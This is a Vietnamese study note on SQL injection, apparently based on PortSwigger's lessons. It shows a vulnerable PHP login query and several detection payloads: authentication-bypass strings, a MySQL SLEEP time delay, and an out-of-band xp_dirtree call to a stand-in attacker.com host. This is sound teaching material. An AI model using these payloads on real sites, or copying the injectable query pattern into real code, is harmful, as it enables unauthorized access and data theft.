# LỖ HỔNG SQL INJECTION (PORTSWIGGER)

---

## 1. SQL injection là gì?

- SQL Injection (SQLi) là một lỗ hổng bảo mật cho phép kẻ tấn công chèn (inject) mã SQL độc hại vào câu truy vấn của ứng dụng để:

  - Truy xuất dữ liệu không được phép

  - Thay đổi, chèn, hoặc xóa dữ liệu

  - Thực hiện các hành vi khác như lấy tài khoản admin, RCE (trong một số trường hợp nâng cao.

- Về bản chất của lỗ hổng SQLi: Khi ứng dụng web nhận input từ người dùng và nhúng trực tiếp vào câu truy vấn SQL mà không kiểm tra hoặc lọc kỹ, hacker có thể thêm đoạn mã SQL độc hại để thao túng truy vấn.

- Ví dụ giả sử đoạn code phía backend xử lý login như sau (PHP + MySQL):

```php
$username = $_POST['username'];
$password = $_POST['password'];

$sql = "SELECT * FROM users WHERE username = '$username' AND password = '$password'";
```

- Nếu người dùng nhập:

```bash
username: admin
password: ' OR '1'='1
```

- Câu truy vấn sẽ trở thành:

```sql
SELECT * FROM users WHERE username = 'admin' AND password = '' OR '1'='1'
```

&rarr;  OR '1'='1' luôn đúng → Hacker đăng nhập được không cần mật khẩu.

## 2. Cách phát hiện lỗ hổng SQL injection

- **Dùng ký tự dấu nháy đơn ' để tìm lỗi**: Đây là một ký tự đặc biệt trong SQL, dùng để bao quanh giá trị dạng chuỗi. Nếu ứng dụng không xử lý đúng input này, nó sẽ làm câu lệnh SQL bị lỗi cú pháp, dẫn đến báo lỗi từ cơ sở dữ liệu.
  
  Giả sử ta có đoạn query bên trong web:

  ```sql
  SELECT * FROM users WHERE username = '$input';
  ```

  Khi người dùng nhập: admin &rarr; câu query trở thành:

  ```sql
  SELECT * FROM users WHERE username = 'admin'';
  ```

  &rarr; Nếu web trả lại lỗi từ SQL (như "syntax error" hoặc "unclosed quotation mark"), có thể tồn tại SQL injection.

- **Dùng điều kiện Boolean (OR 1=1, OR 1=2) để phân biệt**: Dùng những biểu thức đúng/sai trong SQL để kiểm tra phản hồi có thay đổi hay không.

  Giả sử form login có SQL:

  ```sql
  SELECT * FROM users WHERE username = '$user' AND password = '$pass';
  ```

  Khi nhập: user = admin' OR 1=1 -- → câu lệnh trở thành:

  ```sql
  SELECT * FROM users WHERE username = 'admin' OR 1=1 -- ' AND password = 'abc';
  ```

  Do 1=1 luôn đúng, câu lệnh trả về tất cả người dùng → có thể login mà không cần mật khẩu.

- **Dùng payload gây delay (Time-based Blind SQLi)**: Khi ứng dụng không hiển thị lỗi hay khác biệt về nội dung, ta thử gây chậm phản hồi bằng SQL. Nếu server chậm phản hồi đúng như thời gian delay → có thể bị SQLi.

  Ví dụ với MySQL:

  ```sql
  admin' AND SLEEP(5) --
  ```

  Nếu server mất khoảng 5 giây mới trả lời → xác nhận SQL injection tồn tại.

- **OAST payloads (Out-Of-Band Application Security Testing)**: Payload SQL được thiết kế để kích hoạt truy cập mạng đến một máy chủ. Nếu thấy có yêu cầu đến server bạn kiểm soát, thì lỗ hổng tồn tại.

  Ví dụ: với SQL Server, dùng:

  ```sql
  '; exec xp_dirtree('\\attacker.com\test') --
  ```

  → Nếu server gửi truy vấn DNS đến attacker.com, ta biết SQLi đã thực thi.

- Ngoài ra, SQLi có thể tồn tại trong bất ký vị trí nào trong câu truy vấn, và trong nhiều kiểu truy vấn khác nhau: WHERE, UPDATE, INSERT, ORDER BY, ...

  
  

